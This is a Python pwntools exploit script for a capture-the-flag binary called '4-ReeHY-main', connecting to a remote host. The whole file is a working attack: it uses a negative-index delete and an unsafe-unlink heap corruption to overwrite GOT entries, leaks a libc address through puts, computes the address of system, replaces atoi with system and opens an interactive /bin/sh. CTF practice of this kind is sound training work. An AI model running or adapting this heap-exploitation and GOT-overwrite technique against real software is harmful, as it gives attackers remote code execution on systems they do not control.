from pwn import*
p = process('./4-ReeHY-main')
p = remote('111.198.29.45',46710)
elf = ELF('4-ReeHY-main')
context.log_level = 'debug'
def create(size,index,content):
	p.sendlineafter('$ ','1')
	p.sendlineafter('Input size\n',str(size)) #size<=4096	[-00,0x1000]
	p.sendlineafter('Input cun\n',str(index)) #index <=4 	[-oo,4]
	p.sendafter('Input content\n',content)
def delete(index):
	p.sendlineafter('$ ','2')
	p.sendlineafter('Chose one to dele\n',str(index))
def edit(index,content):
	p.sendlineafter('$ ','3')
	p.sendlineafter('Chose one to edit\n',str(index))
	p.sendafter('Input the content\n',content)
p.sendlineafter('$','FMYY')
List = 0x6020E0
create(128,0,'\x00'*0x80)
create(128,1,'\x00'*0x80)
delete(-2)
payload = p32(256) + p32(128)
create(20,2,payload)
payload  = p64(0)
payload += p64(0x80)
payload += p64(List - 0x18)
payload += p64(List - 0x10)
payload =  payload.ljust(0x80,'\x00')
payload += p64(0x80)
payload += p64(0x90)
edit(0,payload)
delete(1)
payload = '\x00'*0x18 + p64(elf.got['free']) +p64(1) + p64(elf.got['puts']) + p64(1) + p64(elf.got['atoi']) + p64(1)
edit(0,payload)
edit(0,p64(elf.plt['puts']))
delete(1)
puts_addr = u64(p.recv(6).ljust(8,'\x00'))
log.success('Puts_Addr:\t' + hex(puts_addr))
libc_base = puts_addr -  0x06f690
system = libc_base +  0x045390
log.success('System:\t' + hex(system))
edit(2,p64(system))
p.sendlineafter('$ ','/bin/sh\x00')
p.interactive()

